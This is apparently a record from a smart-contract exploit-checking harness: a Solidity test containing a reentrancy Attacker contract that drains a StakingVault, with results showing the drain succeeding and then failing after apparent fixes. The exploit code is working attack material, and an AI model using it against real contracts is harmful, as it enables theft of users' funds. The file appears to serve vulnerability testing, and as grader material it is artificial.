@@ -1,0 +1,185 @@
+{
+ "source_sha256": "77c8b55471f4790dd114767722ca3d47fdbde3d11311a1e21275ce097b1baa08",
+ "spec": {
+  "deploy_code": "StakingVault target = new StakingVault{value: 5 ether}();",
+  "attacker_code": "\ncontract Attacker {\n    StakingVault public v;\n    uint256 public hits;\n    constructor(address _v) payable { v = StakingVault(payable(_v)); }\n    function attack() external {\n        v.stake{value: 1 ether}();\n        v.unstake();\n    }\n    receive() external payable {\n        if (hits < 8 && address(v).balance >= 1 ether) { hits++; v.unstake(); }\n    }\n}\n",
+  "mode": "contract",
+  "victim_enter": "target.stake{value: 2 ether}();",
+  "victim_exit": "target.unstake();"
+ },
+ "solidity": "// SPDX-License-Identifier: Apache-2.0\npragma solidity >=0.8.0;\n\nimport \"../src/Target.sol\";\nimport \"./Vm.sol\";\n\ninterface _ArbiterToken { function balanceOf(address) external view returns (uint256); }\n\n/// How an attacker finds out who the victim is. A real attacker can read the chain, so\n/// withholding the victim's address would make whole classes of attack inexpressible --\n/// but that address is drawn per run precisely so SETUP cannot name it. Both hold at once\n/// if the address is discoverable at RUN time and unknowable at WRITE time: your Attacker\n/// asks its own deployer for it.\ninterface _ArbiterHarness { function arbiterVictim() external view returns (address); }\n\nerror ArbiterNoHarm(uint256 recoveredWithoutAttack, uint256 recoveredWithAttack,\n                    uint256 attackerGain);\n\ncontract Attacker {\n    StakingVault public v;\n    uint256 public hits;\n    constructor(address _v) payable { v = StakingVault(payable(_v)); }\n    function attack() external {\n        v.stake{value: 1 ether}();\n        v.unstake();\n    }\n    receive() external payable {\n        if (hits < 8 && address(v).balance >= 1 ether) { hits++; v.unstake(); }\n    }\n}\n\ncontract TestArbiterVictim is Harness {\n    function arbiterVictim() external pure returns (address) { return arbVictim; }\n\n    bytes32 internal constant ARB_COMPLETED = keccak256(\"arbiter.predicate.reached\");\n    address internal constant arbVictim = address(uint160(0x00b07656e1f964b4994763d2ec8834e164cbc868f3));\n\n    StakingVault internal target;\n    Attacker internal atk;\n    // The attacker's two identities, at contract level so they outlive arbDeploy.\n    // Both are measured, because profit parked in the EOA rather than in the contract\n    // is still profit and used to read as zero.\n    address internal constant arbAtkEoa =\n        address(uint160(uint256(keccak256(\"arbiter.attacker\"))));\n    address internal constant arbEoa = address(uint160(0x008b47ee8e19a80c325f5b785bdf2518806b537746));\n\n    function testArbiterVictimLoss() public {\n        require(\n            this.arbiterRun() == ARB_COMPLETED,\n            \"ARBITER: execution halted before the harness predicate ran\"\n        );\n    }\n\n    // ---- agent-supplied fragments, each in its own frame ----\n\n    function arbSetup() external {\n        target = new StakingVault{value: 5 ether}();\n    }\n\n    function arbEnter() external {\n        vm.startPrank(arbVictim, arbVictim);\n        target.stake{value: 2 ether}();\n        vm.stopPrank();\n    }\n\n    function arbExit() external {\n        vm.startPrank(arbVictim, arbVictim);\n        target.unstake();\n        vm.stopPrank();\n    }\n\n    /// The attacker is built ONCE per trial, not once per round.\n    ///\n    /// It used to live at the top of arbAttack, which the round loop calls `rounds`\n    /// times -- so at rounds=8 the attacker was redeployed and re-funded eight times\n    /// and nothing it accumulated survived into the next round. Two consequences, and\n    /// the second is the serious one. Per-round rounding bias, which is the only reason\n    /// the eight-round environment exists, was structurally unprovable. And each\n    /// round's contribution was floored at zero before being summed, so an attack that\n    /// gained one ether and lost one ether each round reported four ether of profit\n    /// against a true net of zero -- while `gain` is the left-hand side of the\n    /// conservation check that makes victim_loss mean *the attacker is holding what the\n    /// victim lost*. That is a constructible false positive, not a missed finding.\n    function arbDeploy() external {\n        atk = new Attacker(address(target));\n        vm.deal(address(atk), 10000000000000000000);\n        vm.deal(arbAtkEoa, 10000000000000000000);\n    }\n\n    function arbAttack() external {\n        atk.attack();\n    }\n\n    /// One world. `withAttack` is the only thing that differs between the two runs of\n    /// a pair; the other three arguments are the environment, which is swept.\n    function arbTrial(bool withAttack, uint256 endow, uint256 warpBy, uint256 rounds)\n        external\n        returns (uint256 recovered, uint256 gain, bool attackRan)\n    {\n        this.arbSetup();\n        if (warpBy > 0) { vm.warp(block.timestamp + warpBy); vm.roll(block.number + 1); }\n        vm.deal(arbVictim, endow);\n        this.arbEnter();\n        uint256 mid = arbVictim.balance;\n\n        attackRan = true;\n        if (withAttack) {\n            // A fresh attacker per round, and a SIGNED delta per round.\n            //\n            // Both halves are load-bearing and they were confused with each other. The\n            // fresh identity is not a bug: an attacker really can deploy a second\n            // contract, and against a contract that keys state by address -- a queue\n            // nonce, a claim marker -- repeating from a new address is the attack.\n            // Removing it was measured to cost a real finding: the reentrancy the\n            // gateway had just proven stopped reproducing, because rounds two onward\n            // reverted on the first attacker's own spent nonce.\n            //\n            // The bug was the flooring. Each round's contribution used to be clamped at\n            // zero before being summed, so an attacker that took one ether and gave one\n            // back reported four ether of profit over eight rounds against a true net of\n            // nothing -- and `gain` is the left-hand side of the conservation check. A\n            // signed sum keeps repetition and prices it honestly: a round that loses\n            // money now subtracts.\n            int256 net;\n            for (uint256 r = 0; r < rounds; r++) {\n                this.arbDeploy();\n                // After the funding, so a handout can never be counted as profit.\n                int256 pre = int256(address(atk).balance + arbAtkEoa.balance);\n                (bool ok, ) =\n                    address(this).call(abi.encodeWithSignature(\"arbAttack()\"));\n                if (r == 0) { attackRan = ok; }\n                if (!ok) { break; }\n                net += int256(address(atk).balance + arbAtkEoa.balance) - pre;\n            }\n            gain = net > 0 ? uint256(net) : 0;\n        }\n\n        // A victim who cannot get out AT ALL has recovered nothing. That is the harm,\n        // not an error, so the revert is caught rather than propagated.\n        (bool exited, ) = address(this).call(abi.encodeWithSignature(\"arbExit()\"));\n        recovered = exited && arbVictim.balance > mid ? arbVictim.balance - mid : 0;\n    }\n\n    /// The endowment, the clock and the number of rounds were never the agent's to\n    /// choose -- they are the harness's constants -- so an attack that is right in\n    /// mechanism and short of scale is being failed for the harness's decision. Each\n    /// environment is tried as a matched PAIR, so the comparison inside a pair is always\n    /// like for like and a sweep can only ever surface an asymmetry, never invent one.\n    function arbiterRun() external returns (bytes32) {\n        uint256[4] memory endow = [uint256(10000000000000000000), 10000000000000000000000, 10000000000000000000, 10000000000000000000];\n        uint256[4] memory warps = [uint256(0), 0, 604800, 0];\n        uint256[4] memory rounds = [uint256(1), 1, 1, 8];\n\n        uint256 bestA;\n        uint256 bestB;\n        uint256 bestGain;\n        bool anyRan;\n\n        for (uint256 i = 0; i < 4; i++) {\n            (bool okA, bytes memory ra) = address(this).call(\n                abi.encodeWithSignature(\n                    \"arbTrial(bool,uint256,uint256,uint256)\",\n                    false, endow[i], warps[i], rounds[i]));\n            if (!okA) { continue; }\n            (uint256 recA, , ) = abi.decode(ra, (uint256, uint256, bool));\n            if (recA == 0) { continue; }   // no baseline, so no harm can be shown\n\n            (bool okB, bytes memory rb) = address(this).call(\n                abi.encodeWithSignature(\n                    \"arbTrial(bool,uint256,uint256,uint256)\",\n                    true, endow[i], warps[i], rounds[i]));\n            if (!okB) { continue; }\n            (uint256 recB, uint256 g, bool ran) = abi.decode(rb, (uint256, uint256, bool));\n            if (!ran) { continue; }\n            anyRan = true;\n\n            // Not `shortfall`. The report block below declares one at function scope, so\n            // this used to shadow it and solc said so on EVERY compile of a victim_loss\n            // exploit -- a nine-line warning quoting two template lines the agent did not\n            // write and cannot change, spent out of the six thousand characters it gets.\n            uint256 gap = recA > recB ? recA - recB : 0;\n            if (gap > 0 && g >= gap) {\n                bestA = recA; bestB = recB; bestGain = g;\n                break;                        // one environment is enough\n            }\n            if (bestA == 0) { bestA = recA; bestB = recB; bestGain = g; }\n        }\n\n        require(anyRan, \"ARBITER: the attack reverted in every environment, or the \"\n                        \"victim's own path never worked -- fix victim_enter/victim_exit\");\n\n        uint256 recoveredA = bestA;\n        uint256 recoveredB = bestB;\n        uint256 attackGain = bestGain;\n\n        // The definition of the vulnerability, and the one thing the agent cannot\n        // arrange for itself: the victim got less back BECAUSE the attack happened, and\n        // the attacker is holding more than they started with.\n        uint256 shortfall = recoveredA > recoveredB ? recoveredA - recoveredB : 0;\n        if (recoveredB >= recoveredA || attackGain == 0 || attackGain < shortfall) {\n            revert ArbiterNoHarm(recoveredA, recoveredB, attackGain);\n        }\n        return ARB_COMPLETED;\n    }\n}\n",
+ "check0": {
+  "status": "pass",
+  "abg": [
+   {
+    "env": 0,
+    "A": 2000000000000000000,
+    "B": 0,
+    "G": 7000000000000000000,
+    "honest_ran": true,
+    "attack_ran": true
+   },
+   {
+    "env": 1,
+    "A": 2000000000000000000,
+    "B": 0,
+    "G": 7000000000000000000,
+    "honest_ran": true,
+    "attack_ran": true
+   },
+   {
+    "env": 2,
+    "A": 2000000000000000000,
+    "B": 0,
+    "G": 7000000000000000000,
+    "honest_ran": true,
+    "attack_ran": true
+   },
+   {
+    "env": 3,
+    "A": 2000000000000000000,
+    "B": 0,
+    "G": 7000000000000000000,
+    "honest_ran": true,
+    "attack_ran": true
+   }
+  ]
+ },
+ "cells": {
+  "2": {
+   "checks": {
+    "0": "pass",
+    "L": "pass",
+    "3": "pass",
+    "1": "pass",
+    "2": "pass"
+   },
+   "accepted": true,
+   "exploit_fail": "[FAIL: ARBITER: the attack reverted in every environment, or the victim's own path never worked -- fix victim_enter/victim_exit] testArbiterVictimLoss() (gas: 1806356)",
+   "abg_after": [
+    {
+     "env": 0,
+     "A": 2000000000000000000,
+     "B": 2000000000000000000,
+     "G": 0,
+     "honest_ran": true,
+     "attack_ran": false
+    },
+    {
+     "env": 1,
+     "A": 2000000000000000000,
+     "B": 2000000000000000000,
+     "G": 0,
+     "honest_ran": true,
+     "attack_ran": false
+    },
+    {
+     "env": 2,
+     "A": 2000000000000000000,
+     "B": 2000000000000000000,
+     "G": 0,
+     "honest_ran": true,
+     "attack_ran": false
+    },
+    {
+     "env": 3,
+     "A": 2000000000000000000,
+     "B": 2000000000000000000,
+     "G": 0,
+     "honest_ran": true,
+     "attack_ran": false
+    }
+   ]
+  },
+  "3": {
+   "checks": {
+    "0": "pass",
+    "L": "pass",
+    "3": "pass",
+    "1": "pass",
+    "2": "pass"
+   },
+   "accepted": true,
+   "exploit_fail": "[FAIL: ARBITER: the attack reverted in every environment, or the victim's own path never worked -- fix victim_enter/victim_exit] testArbiterVictimLoss() (gas: 1806356)",
+   "abg_after": [
+    {
+     "env": 0,
+     "A": 2000000000000000000,
+     "B": 2000000000000000000,
+     "G": 0,
+     "honest_ran": true,
+     "attack_ran": false
+    },
+    {
+     "env": 1,
+     "A": 2000000000000000000,
+     "B": 2000000000000000000,
+     "G": 0,
+     "honest_ran": true,
+     "attack_ran": false
+    },
+    {
+     "env": 2,
+     "A": 2000000000000000000,
+     "B": 2000000000000000000,
+     "G": 0,
+     "honest_ran": true,
+     "attack_ran": false
+    },
+    {
+     "env": 3,
+     "A": 2000000000000000000,
+     "B": 2000000000000000000,
+     "G": 0,
+     "honest_ran": true,
+     "attack_ran": false
+    }
+   ]
+  },
+  "4": {
+   "checks": {
+    "0": "pass",
+    "L": "pass",
+    "3": "pass",
+    "1": "pass",
+    "2": "pass"
+   },
+   "accepted": true,
+   "exploit_fail": "[FAIL: ARBITER: the attack reverted in every environment, or the victim's own path never worked -- fix victim_enter/victim_exit] testArbiterVictimLoss() (gas: 1806356)",
+   "abg_after": [
+    {
+     "env": 0,
+     "A": 2000000000000000000,
+     "B": 2000000000000000000,
+     "G": 0,
+     "honest_ran": true,
+     "attack_ran": false
+    },
+    {
+     "env": 1,
+     "A": 2000000000000000000,
+     "B": 2000000000000000000,
+     "G": 0,
+     "honest_ran": true,
+     "attack_ran": false
+    },
+    {
+     "env": 2,
+     "A": 2000000000000000000,
+     "B": 2000000000000000000,
+     "G": 0,
+     "honest_ran": true,
+     "attack_ran": false
+    },
+    {
+     "env": 3,
+     "A": 2000000000000000000,
+     "B": 2000000000000000000,
+     "G": 0,
+     "honest_ran": true,
+     "attack_ran": false
+    }
+   ]
+  }
+ }
+}
